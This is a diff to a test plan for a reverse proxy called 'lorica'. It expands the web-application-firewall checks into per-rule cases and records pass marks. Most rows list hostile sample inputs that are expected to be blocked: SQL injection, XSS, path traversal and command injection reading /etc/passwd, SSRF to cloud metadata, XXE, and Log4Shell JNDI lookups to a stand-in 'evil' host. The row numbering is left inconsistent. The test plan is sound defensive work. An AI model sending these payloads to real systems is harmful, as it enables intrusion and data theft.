@@ -119,45 +119,63 @@ Test with `--workers 6` to validate worker mode simultaneously.
 | 5.24 | Private key encrypted at rest | CLI | `sqlite3 lorica.db` -> binary blob, not PEM | 4.5 | |
 | 5.25 | HTTPS works in worker mode | Proxy | `--workers 6` + TLS cert -> HTTPS serves traffic | 2.1 | |
 | | **6. SECURITY** | | | | |
-| 6.1 | WAF rules listed (28 rules) | Dashboard | Security > Rules tab -> 28 rules | 3.1 | |
+| 6.1 | WAF rules listed (27 rules) | Dashboard | Security > Rules tab -> 27 rules | 3.1 | OK |
 | 6.2 | WAF rule toggle | Dashboard | Disable/enable individual rule | 3.1 | |
 | 6.3 | WAF custom rule | Dashboard | Create custom regex rule | 3.1 | |
 | 6.4 | WAF detection mode | Proxy | waf_mode=detection -> logged, not blocked | 3.1 | |
 | 6.5 | WAF blocking mode | Proxy | waf_mode=blocking -> 403 | 3.1 | OK |
-| 6.6 | WAF: SQL injection | Proxy | `?q=UNION+SELECT+password+FROM+users` -> 403 | 3.1 | OK |
-| 6.7 | WAF: XSS | Proxy | `?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E` -> 403 | 3.1 | OK |
-| 6.8 | WAF: Path traversal | Proxy | `../../../etc/passwd` -> detected | 3.1 | |
-| 6.9 | WAF: Command injection | Proxy | `; cat /etc/passwd` -> detected | 3.1 | |
-| 6.10 | WAF: SSRF | Proxy | `?url=http://169.254.169.254/latest/meta-data/` -> 403 | - | OK |
-| 6.11 | WAF: Log4Shell | Proxy | `X-Api-Version: ${jndi:ldap://evil.com/x}` -> 403 | - | OK |
-| 6.12 | WAF: XXE | Proxy | `<!DOCTYPE SYSTEM>` -> detected | - | |
-| 6.13 | WAF: CRLF | Proxy | `%0d%0a` -> detected | - | |
-| 6.14 | WAF events displayed | Dashboard | Events tab -> category/severity | 3.1 | OK |
-| 6.15 | WAF events filter by category | Dashboard | Filter dropdown works | 3.1 | |
-| 6.16 | WAF stats cards | Dashboard | Events by category, top attack | 3.1 | OK |
-| 6.17 | WAF < 0.5ms latency | API | Prometheus -> evaluation < 0.5ms | 3.1 | OK |
-| 6.18 | waf_alert notification | CLI | WAF blocks request -> notification | 3.3 | |
-| 6.19 | IP blocklist enable | Dashboard | Blocklist toggle ON -> ~80k IPs loaded | - | OK |
-| 6.20 | IP blocklist blocks IP | Proxy | Blocklisted IP via XFF -> 403 | - | OK |
-| 6.21 | IP blocklist refresh | Dashboard | Reload button -> fresh list | - | |
-| 6.22 | IP blocklist at startup | CLI | Restart -> logs "loaded at startup" 82k IPs | - | OK |
-| 6.23 | WAF blocked in access logs | Dashboard | 403 WAF shows "WAF blocked" in error column | - | OK |
-| 6.24 | IP blocklist in WAF events | Dashboard | Blocklist block appears in WAF events | - | OK |
-| 6.25 | WAF events persisted | CLI | Restart -> WAF events survive in SQLite | - | OK |
-| 6.26 | Rate limiting | Proxy | > rate_limit_rps -> 429 + Retry-After | 7.2 | |
-| 6.27 | Rate limit headers | Proxy | X-RateLimit-Limit/Remaining/Reset | 7.2 | |
-| 6.28 | Rate limit burst | Proxy | Burst tolerance allows spikes | 7.2 | |
-| 6.29 | Auto-ban on repeated 429 | Proxy | N violations -> 403 (banned) | 7.3 | |
-| 6.30 | WAF auto-ban on repeated blocks | Proxy | N WAF blocks -> IP banned | - | |
-| 6.31 | Ban list visible | Dashboard | Bans tab -> IPs with expiry | 7.3 | |
-| 6.32 | Manual unban | Dashboard | Click unban -> IP removed | 7.3 | |
-| 6.33 | Ban auto-expiry | Proxy | Wait ban_duration_s -> unbanned | 7.3 | |
-| 6.30 | ip_banned notification | CLI | Auto-ban -> notification dispatched | 7.3 | |
-| 6.31 | Slowloris detection | Proxy | Slow headers -> 408 | 7.3 | |
-| 6.32 | Per-route max connections | Proxy | max_connections=2, 3rd -> 503 | 7.2 | |
-| 6.33 | Global connection limit | Proxy | max_global_connections -> 503 | 7.3 | |
-| 6.34 | Flood defense | Proxy | RPS > threshold -> limits halved | 7.3 | |
-| 6.35 | IP allowlist | Proxy | Non-allowed IP -> blocked | - | |
+| 6.6 | WAF: SQLi UNION SELECT (942100) | Proxy | `?q=UNION+SELECT+password+FROM+users` -> 403 | 3.1 | OK |
+| 6.7 | WAF: SQLi comment seq (942110) | Proxy | `?q=admin'--` -> 403 | 3.1 | OK |
+| 6.8 | WAF: SQLi OR 1=1 (942120) | Proxy | `?q=test+or+1=1` -> 403 | 3.1 | OK |
+| 6.9 | WAF: SQLi sleep() (942130) | Proxy | `?q=sleep(5)` -> 403 | 3.1 | OK |
+| 6.10 | WAF: SQLi DROP TABLE (942140) | Proxy | `?q=drop+table+users` -> 403 | 3.1 | OK |
+| 6.11 | WAF: SQLi stacked query (942150) | Proxy | `?q=1;select+1` -> 403 | 3.1 | OK |
+| 6.12 | WAF: XSS script tag (941100) | Proxy | `?q=<script>alert(1)</script>` -> 403 | 3.1 | OK |
+| 6.13 | WAF: XSS onerror (941110) | Proxy | `?q=<img onerror=alert(1)>` -> 403 | 3.1 | OK |
+| 6.14 | WAF: XSS javascript: (941120) | Proxy | `?q=javascript:alert(1)` -> 403 | 3.1 | OK |
+| 6.15 | WAF: XSS data:text/html (941130) | Proxy | `?q=data:text/html,...` -> 403 | 3.1 | OK |
+| 6.16 | WAF: XSS iframe (941140) | Proxy | `?q=<iframe src=evil>` -> 403 | 3.1 | OK |
+| 6.17 | WAF: XSS svg onload (941150) | Proxy | `?q=<svg onload=alert(1)>` -> 403 | 3.1 | OK |
+| 6.18 | WAF: Path traversal ../ (930100) | Proxy | `?q=../../../etc/passwd` -> 403 | 3.1 | OK |
+| 6.19 | WAF: Sensitive file (930110) | Proxy | `?q=/etc/passwd` -> 403 | 3.1 | OK |
+| 6.20 | WAF: Null byte (930120) | Proxy | `?q=test%00.php` -> 403 | 3.1 | OK |
+| 6.21 | WAF: Command injection (932100) | Proxy | `?q=;cat+/etc/passwd` -> 403 | 3.1 | OK |
+| 6.22 | WAF: Backtick subshell (932110) | Proxy | `` ?q=`id` `` -> 403 | 3.1 | OK |
+| 6.23 | WAF: CRLF injection (920110) | Proxy | `?q=test%0d%0aInjected` -> 403 | 3.1 | OK |
+| 6.24 | WAF: SSRF cloud metadata (934100) | Proxy | `?url=http://169.254.169.254/latest` -> 403 | - | OK |
+| 6.25 | WAF: SSRF localhost (934110) | Proxy | `?url=http://127.0.0.1/admin` -> 403 | - | OK |
+| 6.26 | WAF: SSRF dangerous scheme (934120) | Proxy | `?url=file:///etc/passwd` -> 403 | - | OK |
+| 6.27 | WAF: SSRF internal net (934130) | Proxy | `?url=http://192.168.1.1:8080/admin` -> 403 | - | OK |
+| 6.28 | WAF: Log4Shell JNDI (944100) | Proxy | `X-Custom: ${jndi:ldap://evil/x}` -> 403 | - | OK |
+| 6.29 | WAF: Log4Shell protocol (944110) | Proxy | `X-Custom: jndi:ldap:` -> 403 | - | OK |
+| 6.30 | WAF: XXE DOCTYPE (936100) | Proxy | `?q=<!DOCTYPE foo SYSTEM "evil">` -> 403 | - | OK |
+| 6.31 | WAF: XXE ENTITY (936110) | Proxy | `?q=<!ENTITY xxe SYSTEM "file:///...">` -> 403 | - | OK |
+| 6.32 | WAF events displayed | Dashboard | Events tab -> category/severity | 3.1 | OK |
+| 6.33 | WAF events filter by category | Dashboard | Filter dropdown works | 3.1 | |
+| 6.34 | WAF stats cards | Dashboard | Events by category, top attack | 3.1 | OK |
+| 6.35 | WAF < 0.5ms latency | API | Prometheus -> evaluation < 0.5ms | 3.1 | OK |
+| 6.36 | waf_alert notification | CLI | WAF blocks request -> notification | 3.3 | |
+| 6.37 | IP blocklist enable | Dashboard | Blocklist toggle ON -> ~80k IPs loaded | - | OK |
+| 6.38 | IP blocklist blocks IP | Proxy | Blocklisted IP via XFF -> 403 | - | OK |
+| 6.39 | IP blocklist refresh | Dashboard | Reload button -> fresh list | - | |
+| 6.40 | IP blocklist at startup | CLI | Restart -> logs "loaded at startup" 82k IPs | - | OK |
+| 6.41 | WAF blocked in access logs | Dashboard | 403 WAF shows "WAF blocked" in error column | - | OK |
+| 6.42 | IP blocklist in WAF events | Dashboard | Blocklist block appears in WAF events | - | OK |
+| 6.43 | WAF events persisted | CLI | Restart -> WAF events survive in SQLite | - | OK |
+| 6.44 | WAF auto-ban on repeated blocks | Proxy | 20 WAF blocks from same IP -> IP banned | - | OK |
+| 6.45 | Ban list visible | Dashboard | Bans tab -> IPs with expiry | 7.3 | OK |
+| 6.46 | Rate limiting | Proxy | > rate_limit_rps -> 429 + Retry-After | 7.2 | |
+| 6.47 | Rate limit headers | Proxy | X-RateLimit-Limit/Remaining/Reset | 7.2 | |
+| 6.48 | Rate limit burst | Proxy | Burst tolerance allows spikes | 7.2 | |
+| 6.49 | Auto-ban on repeated 429 | Proxy | N violations -> 403 (banned) | 7.3 | |
+| 6.50 | ip_banned notification | CLI | Auto-ban -> notification dispatched | 7.3 | |
+| 6.51 | Manual unban | Dashboard | Click unban -> IP removed | 7.3 | |
+| 6.52 | Ban auto-expiry | Proxy | Wait ban_duration_s -> unbanned | 7.3 | |
+| 6.53 | Slowloris detection | Proxy | Slow headers -> 408 | 7.3 | |
+| 6.54 | Per-route max connections | Proxy | max_connections=2, 3rd -> 503 | 7.2 | |
+| 6.55 | Global connection limit | Proxy | max_global_connections -> 503 | 7.3 | |
+| 6.56 | Flood defense | Proxy | RPS > threshold -> limits halved | 7.3 | |
+| 6.57 | IP allowlist | Proxy | Non-allowed IP -> blocked | - | |
 | 6.36 | IP denylist | Proxy | Denied IP -> blocked | - | |
 | 6.37 | CORS headers | Proxy | Access-Control-* headers set | - | |
 | | **7. CACHING** | | | | |
